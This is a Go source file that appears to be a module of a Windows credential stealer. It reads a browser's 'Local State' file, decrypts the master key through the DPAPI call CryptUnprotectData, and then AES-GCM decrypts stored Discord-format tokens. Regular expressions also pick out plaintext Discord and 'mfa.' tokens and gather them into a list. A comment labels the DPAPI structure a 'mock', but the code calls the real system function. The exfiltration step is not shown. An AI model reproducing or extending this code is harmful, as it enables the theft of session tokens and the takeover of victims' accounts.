package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"regexp"
	"strings"
	"syscall"
	"unsafe"
)

type JsonCryptFile struct {
	Storage WINCRYPT `json:"os_crypt"`
}

type WINCRYPT struct {
	EncryptedKey string `json:"encrypted_key"`
}

type DATA_BLOB struct { // Mock Windows DPAPI DATA_BLOB
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	// Create and return a new instance of the mock Windows DPAPI DATA_BLOB
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	// Convert the Windows DPAPI object to a byte array using a bit shift operation
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])

	return d
}

func DecryptBytes(data []byte) ([]byte, error) {
	// Decrypt the supplied bytes using Windows DPAPI
	var outblob DATA_BLOB

	rPointer, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outblob)),
	)
	if rPointer == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))

	return outblob.ToByteArray(), nil
}

func GetMasterKey(location string) ([]byte, error) {
	// Get DPAPI MasterKey from the supplied locations' Local State
	jsonFile := CleanPath(location + "\\Local State")

	byteValue, err := os.ReadFile(jsonFile)
	if err != nil {
		return nil, err
	}

	var fileContent JsonCryptFile
	err = json.Unmarshal(byteValue, &fileContent)
	if err != nil {
		return nil, err
	}

	baseEncryptedKey := fileContent.Storage.EncryptedKey
	encryptedKey, err := base64.StdEncoding.DecodeString(baseEncryptedKey)
	if err != nil {
		return nil, err
	}
	encryptedKey = encryptedKey[5:]

	plaintextKey, err := DecryptBytes(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("decryption failed: %w", err)
	}

	return plaintextKey, nil
}

func DecryptBrowserValue(encrypted string, masterKey []byte) string {
	ciphertext := []byte(encrypted)
	c, err := aes.NewCipher(masterKey)
	if err != nil {
		return ""
	}
	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return ""
	}
	nSize := gcm.NonceSize()
	if len(ciphertext) < nSize {
		return ""
	}

	ns, ciphertext := ciphertext[:nSize], ciphertext[nSize:]
	plaintext, err := gcm.Open(nil, ns, ciphertext, nil)
	if err != nil {
		return ""
	}

	return string(plaintext)
}

func DecryptToken(buffer []byte, location string) string {
	// Decrypt token using MasterKey
	iv := buffer[3:15]
	payload := buffer[15:]

	key, _ := GetMasterKey(location)
	block, _ := aes.NewCipher(key)
	aesGCM, _ := cipher.NewGCM(block)

	ivSize := len(iv)
	if len(payload) < ivSize {
		return ""
	}

	plaintext, _ := aesGCM.Open(nil, iv, payload, nil)

	return string(plaintext) // Decrypted token
}

func GetEncryptedToken(line []byte, location string, tokenList *[]string) {
	// Use a regex to search for and parse the token and append it in its decrypted form
	var tokenRegex = regexp.MustCompile("dQw4w9WgXcQ:[^\"]*")

	for _, match := range tokenRegex.FindAll(line, -1) {
		baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
		encryptedToken, _ := base64.StdEncoding.DecodeString(baseToken)
		token := DecryptToken(encryptedToken, location)

		*tokenList = append(*tokenList, token)
	}
}

func GetDecryptedToken(line []byte, tokenList *[]string) {
	// Use a simple regex to find the token in the passed file line
	var tokenRegex = regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)

	for _, match := range tokenRegex.FindAll(line, -1) {
		token := string(match)
		*tokenList = append(*tokenList, token)
	}
}

var (
	dllCrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllKernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllCrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllKernel32.NewProc("LocalFree")
)
